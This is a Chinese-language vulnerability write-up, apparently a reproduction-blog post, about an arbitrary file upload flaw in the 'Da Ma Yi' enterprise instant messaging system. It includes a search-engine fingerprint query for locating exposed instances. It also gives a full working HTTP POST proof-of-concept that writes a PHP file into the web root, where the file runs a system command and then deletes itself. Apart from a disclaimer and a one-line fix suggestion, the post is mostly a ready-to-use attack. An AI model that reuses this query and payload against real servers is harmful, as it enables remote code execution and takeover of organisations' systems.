#  大蚂蚁即时通讯系统任意文件上传漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-09 02:39  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
  
# 大蚂蚁即时通讯系统任意文件上传漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS14YNCeica6xQZSxF1Rvv2FpSNKDnmC99NiaPKZOgVX5Nk400Ljcic8LO9prl26W3iaLV8w5OexeaCxQiacCicsgXXpwBQTxk8dX7iaOo/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
大蚂蚁即时通讯系统是一款面向企业及政府机构的国产即时通讯平台，支持私有化部署，提供端到端数据加密、权限控制等安全功能，涵盖即时消息、文件传输、远程协助、音视频会  
议、文档管理等核心功能，支持多终端接入，适用于大型组织  
架构，可与企业现有业务系统深度集成，满足企业内部高效沟通与协作需求。  
任  
意文件  
上传漏洞源于大  
蚂蚁即时通讯系统的接口在处理文件上传  
时，未  
对  
上传文件  
的类型及存储  
路径进行严格校验。攻击者可通过构造恶意  
的参数，绕过系统预设的存储目录限制，将恶意文件直接写入Web根目录，从而获取服务器控制权限。  
  
04  
  
—  
  
资产测绘  
```
(body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js")||title="即时通讯 系统登录"&& body="/Public/static/ukey/Syunew3.js"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1CwJp1T8rrWGcVa1cuo6Glliao0a9kA5onru1m8NrsZiaq1ibX8Lwqf7pd1qYBJuL784p1n55dhdNIcVnJyYweSDicHkOkUowfrN0/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /?m=Api&c=DispersedAddin&a=upload_file HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7npyIb86NUax9Xx
Content-Length: 307

------WebKitFormBoundaryl7npyIb86NUax9Xx
Content-Disposition: form-data; name="file_info"

[{"file_path":"test123.php"}]
------WebKitFormBoundaryl7npyIb86NUax9Xx
Content-Disposition: form-data; name="file"; filename="1.txt"

<?=`dir`;unlink(__FILE__);
------WebKitFormBoundaryl7npyIb86NUax9Xx--
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1MOozehibeNZD0Ingpia3XSbJzxlicy5jpV24lldcF9MfImtf3G8AricibPjiaflUTHBj1kdsq8Dk9JuDOJKSPzZq1UjJ1hmNuUp9bw/640?wx_fmt=png&from=appmsg "")  
  
在URL后面拼  
接  
路径  
/test123.php  
   http://127.0.0.1/test123.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1hOHvjiaCoY13g2UDK94zckRD4J8rWh5YgPuA0kw9EZyroJruEdaz2rL5jJzV4Kqpv85gypj9jibxBibS4QJkQrlNa3OlnfSicL44/640?wx_fmt=png&from=appmsg "")  
  
  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
